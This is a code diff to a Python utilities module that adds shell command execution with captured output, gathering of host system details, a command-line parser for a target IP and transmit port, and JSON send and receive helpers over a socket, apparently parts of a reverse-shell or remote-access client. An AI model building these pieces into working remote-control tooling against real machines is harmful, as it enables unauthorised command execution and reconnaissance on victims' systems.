@@ -5,6 +5,8 @@ Common utilities.
 import requests
 import subprocess
 import argparse
+import platform
+import json
 
 # downloads a file from a url to a specific location
 def download(url):
@@ -19,15 +21,40 @@ def download(url):
 
 # executes a command and returns the output
 def execute_cmd(cmd):
-    output = subprocess.run(cmd.split(" "), capture_output=True, shell=True)
+    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    std_out = op.stdout.read()
+    std_err = op.stderr.read()
 
-    if output.returncode == 0:
-        return output.stdout.decode('utf-8')
-    else:
-        return output.stderr.decode('utf-8')
+    return std_out + std_err
 
+
+
+# initializes argument parser
 def init_argparse(desc):
     parser = argparse.ArgumentParser(description=desc)
     parser.add_argument("--port", "-p", type=int, required=True, help="The port to transmit on.")
     parser.add_argument("ip", type=str, help="The ip of the host to connect to.")
     return parser.parse_args()
+
+# retuns system information gathered from platform mod
+def sys_info():
+    info = ('OS: {os}'
+            '\nVersion: {version}'
+            '\nArchitecture: {arch}'
+            '\nNetwork Name: {name}\n'
+            ).format(os=platform.system(), 
+            version=platform.version(), 
+            arch=platform.machine(), 
+            name=platform.node())
+
+    return info.encode()
+
+# serializes data to send it
+def send_data(conn, data):
+    json_data = json.dumps(data)
+    conn.send(json_data.encode())
+
+# deserializes data to receive it
+def recv_data(conn):
+    json_data = conn.recv(1024)
+    return json.loads(json_data)
